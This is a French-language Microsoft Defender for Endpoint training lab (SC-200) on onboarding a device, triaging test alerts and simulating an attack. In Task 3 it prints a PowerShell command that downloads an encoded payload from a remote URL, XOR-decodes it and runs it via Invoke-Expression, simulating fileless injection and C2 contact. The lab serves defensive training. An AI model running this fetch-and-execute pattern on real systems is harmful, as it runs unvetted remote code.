---
lab:
  title: "Exercice 2\_-\_Atténuer les attaques avec Micrsoft Defender for Endpoint"
  module: Learning Path 2 - Mitigate threats using Microsoft Defender for Endpoint
---

# Parcours d'apprentissage 2 - Labo 1 - Exercice 2 - Atténuer les attaques avec Microsoft Defender for Endpoint

## Scénario du labo

![Vue d’ensemble du labo](../Media/SC-200-Lab_Diagrams_Mod2_L1_Ex2_10_19.png)

Vous êtes un analyste des opérations de sécurité travaillant dans une entreprise qui implémente Microsoft Defender pour point de terminaison. Votre responsable prévoit d’intégrer quelques appareils afin de fournir des informations sur les modifications requises des procédures de réponse de l’équipe chargée des opérations de sécurité.

Pour explorer les fonctionnalités d’atténuation des risques d’attaque Defender for Endpoint, vous allez vérifier que l’intégration de l’appareil a réussi et examiner les alertes et incidents créés pendant ce processus.

### Tâche 1 : Vérifier l’intégration de l’appareil

Dans cette tâche, vous allez confirmer que l’appareil a été intégré avec succès et créer une alerte de test.

1. Si vous n’êtes pas encore sur le portail Microsoft Defender XDR dans votre navigateur Microsoft Edge, accédez à (<https://security.microsoft.com>) et connectez-vous en tant qu’administrateur pour votre locataire.

1. Dans le menu de gauche, sous la zone **Ressources** , sélectionnez **Appareils**. Veuillez patienter jusqu’à ce que WIN1 apparaisse sur la page Appareils avant de continuer. Sinon, vous devrez peut-être répéter cette tâche pour voir les alertes qui seront générées ultérieurement.

    >**Remarque :** si vous avez terminé le processus d’intégration et que vous ne voyez pas d’appareils sur la liste Appareils au bout d’une heure, cela peut indiquer un problème d’intégration ou de connectivité.

1. Dans la barre de menus de gauche du portail Microsoft Defender XDR, développez la section **Système**, puis sélectionnez **Paramètres**. Ensuite, sur la page *Paramètres*, sélectionnez **Points de terminaison**.

1. Sélectionnez **Intégration** dans la section Gestion des appareils, puis vérifiez si *« Windows 10 et Windows 111 »* est sélectionné comme système d’exploitation. Le message *« Premier appareil intégré »* affiche désormais *Terminé*.

1. Faites défiler la page vers le bas puis, sous la section *« 2. Exécuter un test de détection »,* puis copiez le script de test de détection en sélectionnant le bouton **Copier**.  

1. Dans la barre de recherche Windows de la machine virtuelle WIN1, tapez **CMD** et choisissez **Exécuter en tant qu’administrateur** dans le volet droit de l’application Invite de commandes.

1. Lorsque la fenêtre « Contrôle de compte d’utilisateur » apparaît, sélectionnez **Oui** pour autoriser l’exécution de l’application. 

1. Collez le script en cliquant avec le bouton droit dans les fenêtres d’invite **Administrateur : Invite de commande**, ppuis appuyez sur **Entrée** pour l’exécuter.

    >**Remarque :** La fenêtre se ferme automatiquement après l’exécution du script et, après quelques minutes, les alertes sont générées dans le portail Microsoft Defender XDR.

### Tâche 2 : Examiner les alertes et les incidents

Dans cette tâche, vous allez examiner les alertes et les incidents générés par le script de test de détection d’intégration dans la tâche précédente.

1. Dans le portail Microsoft Defender XDR, développez **Enquête et réponse** dans la barre de menus de gauche, développez **Incidents et alertes**, puis sélectionnez **Alertes**.

    >**Remarque :** Dans les versions mises à jour de la page du portail Microsoft Defender XDR, la section *Incidents et alertes* se trouve sous l’en-tête de menu *Enquête et réponse*.

1. Dans le volet **Alertes**, sélectionnez l’alerte nommée *[TestAlert] Ligne de commande PowerShell suspecte* pour charger ses détails.

1. Passez en revue la chronologie *Historique de l’alerte*, puis les onglets *Détails* et *Recommandations*.

    >**Remarque :** Sous l’onglet *Détails* de l’alerte, vous pouvez faire défiler jusqu’à la section *Détails de l’incident* et sélectionner le lien *Incident d’exécution sur un point de terminaison* pour ouvrir l’incident.

1. Dans le portail Microsoft Defender XDR, sélectionnez **Incidents et alertes** dans le menu de gauche, puis **Incidents**.

1. Effacez le filtre *Gravité de l’alerte* en sélectionnant la croix **X** à droite du filtre.

1. Un nouvel incident nommé *[TestAlert] Ligne de commande PowerShell suspecte* apparaît dans le volet de droite. Sélectionnez le nom de l’incident pour charger ses informations.

1. Sélectionnez le lien **Gérer l’incident** (avec une icône de crayon) et un nouveau panneau de fenêtre s’affiche.

1. Sous **Balises d’incident**, tapez « Simulation », puis sélectionnez **Simulation (Créer)** pour créer une balise.

1. Sélectionnez le bouton bascule **Attribuer à** et ajoutez votre compte d’utilisateur (Moi) en tant que propriétaire de l’incident.

1. Sous **Classification**, développez le menu déroulant.

1. Sous **Informational, activité  attendue**, sélectionnez **Test de sécurité**.

1. Sélectionnez **Enregistrer** pour mettre à jour l’incident et terminer.

1. Passez en revue le contenu des onglets  *Histoire d’attaque, Alertes, Ressources, Investigations, Preuve et réponse* et *Résumé*. Les appareils et les utilisateurs se trouvent sous l’onglet *Ressources*. Dans un vrai incident, l’onglet *Historique de l’attaque* affiche le *graphique de l’incident*. **Conseil :** Certains onglets risquent d’être masqués en raison de la taille de votre écran. Sélectionnez l’onglet représentant des points de suspension (...) pour les afficher.

### Tâche 3 : Simuler une attaque

>**Avertissement :** Cette attaque simulée constitue une excellente source d’apprentissage via la pratique. Effectuez uniquement l’attaque dans les instructions fournies pour ce labo lors de l’utilisation du cours fourni au tenant Azure.  Vous pouvez effectuer d’autres attaques simulées *après* avoir effectué ce cours de formation avec ce tenant.

Dans cette tâche, vous allez simuler une attaque sur la machine virtuelle WIN1 et vérifier la détection et l’atténuation de l’attaque par Microsoft Defender for Endpoint.

1. Sur la machine virtuelle WIN1, *cliquez avec le bouton droit* sur **Démarrer**, puis choisissez **Windows PowerShell (admin)**.

1. Lorsque la fenêtre « Contrôle de compte d’utilisateur » apparaît, sélectionnez **Oui** pour autoriser l’exécution de l’application.

1. Copiez et collez le script de simulation suivant dans la fenêtre PowerShell, puis appuyez sur **Entrée** pour l’exécuter :

    ```PowerShell
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    ;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
    $base64String = (Invoke-WebRequest -URI "https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt" -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
    $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
    ```

    >**Remarque :** Si vous rencontrez des erreurs (en rouge) lors de l’exécution du script, vous pouvez ouvrir l’application Bloc-notes et copier le script dans un fichier vide. Vérifiez que *Retour automatique à la ligne* est activé dans Bloc-notes. Ensuite, copiez et exécutez séparément chaque ligne du script dans PowerShell. En outre, un script PowerShell (attacksim.ps1) a été fourni dans les fichiers téléchargés au début des labos. Pour utiliser le script, dans **Windows PowerShell (Administrateur)**, accédez au dossier *\Users\Admin\Desktop\Allfiles*, tapez *.\attacksim.ps1*, puis appuyez sur **Entrée** pour l’exécuter.

1. Le script génère plusieurs lignes de sortie et un message indiquant *Impossible de résoudre les contrôleurs de domaine dans le domaine*. Quelques secondes plus tard, l’application *Bloc-notes* s’ouvre. Un code d’attaque simulé est injecté dans Bloc-notes. Laissez l’instance Bloc-notes générée automatiquement ouverte pour expérimenter le scénario complet. Le code d’attaque simulé va tenter de communiquer avec une adresse IP externe (simulant un serveur C2).

### Tâche 4 : Examiner l’attaque simulée en tant qu’incident unique

1. Dans le portail Microsoft Defender XDR, développez **Enquête et réponse** dans la barre de menus de gauche, développez **Incidents et alertes**, puis sélectionnez **Incidents**.

    >**Remarque :** Dans les versions mises à jour de la page du portail Microsoft Defender XDR, la section *Incidents et alertes* se trouve sous l’en-tête de menu *Enquête et réponse*.

1. Un nouvel incident appelé *Incident à plusieurs étapes impliquant le contournement de la défense et la découverte sur un point de terminaison* se trouve dans le volet droit. Sélectionnez le nom de l’incident pour charger ses informations.

    >**Remarque :** Si l’incident n’apparaît pas, veillez à effacer le filtre *Gravité de l’alerte* en sélectionnant la croix **X** à droite du filtre.

1. Sous l’onglet *Historique de l’attaque*, réduisez les volets **Alertes** et **Détails de l’incident** pour afficher le **Graphique de l’incident** complet.

1. Placez la souris au-dessus et sélectionnez les **Nœuds du graphique de l’incident** pour passer en revue les *entités*.

1. Développez à nouveau le volet **Alertes** (côté gauche) et sélectionnez l’icône **Lire l’historique de l’attaque** *Exécuter*. Cela montre la chronologie de l’attaque alerte par alerte et remplit dynamiquement le *Graphique Ide l’incident*.

1. Passez en revue le contenu des onglets  *Histoire d’attaque, Alertes, Ressources, Investigations, Preuve et réponse* et *Résumé*. Les appareils et les utilisateurs se trouvent sous l’onglet *Ressources*. **Conseil :** Certains onglets risquent d’être masqués en raison de la taille de votre écran. Sélectionnez l’onglet représentant des points de suspension (...) pour les afficher.

1. Sous l’onglet **Preuve et réponse**, sélectionnez **Adresses IP**, puis sélectionnez l’*Adresse IP* affichée. Dans la fenêtre contextuelle, passez en revue les détails de l’adresse IP et faites défiler vers le bas de l’écran, puis sélectionnez le bouton **Ouvrir la page d’adresse IP**.

1. Passez en revue le contenu de la page *Adresse IP*, des onglets *Vue d’ensemble, Incidents et alertes et Observé dans les organisations*. Il est possible que certains onglets ne contiennent pas d’informations relatives à l’adresse IP.

## Vous avez terminé le labo
